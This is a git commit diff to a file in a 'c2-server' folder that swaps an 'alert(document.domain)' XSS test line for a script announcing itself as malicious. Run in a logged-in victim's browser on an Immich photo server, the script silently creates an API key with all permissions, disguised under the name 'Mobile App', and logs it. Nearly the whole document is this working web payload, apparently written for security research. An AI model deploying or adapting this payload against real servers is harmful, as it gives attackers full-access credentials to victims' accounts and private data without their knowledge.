36855becaca4d1004d340344859bd0cbb93d5c35
emanuelepns <69849793+emanuelepns@users.noreply.github.com>
2026-05-14 21:46:20 +0200

    Added script for API key creation

--- c2-server/tomas.js
+++ c2-server/tomas.js
@@ -1,1 +1,17 @@
-alert(document.domain)
+console.log("Malicious script started...");
+
+async function createKey() {
+    // to create an API key: https://api.immich.app/endpoints/api-keys/createApiKey
+    const response = await fetch('/api/api-keys', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name: 'Mobile App',
+                               permissions: ["all"]}) 
+    });
+    const data = await response.json();
+    
+    console.log("API key created:");
+    console.log(data);
+}
+
+createKey();
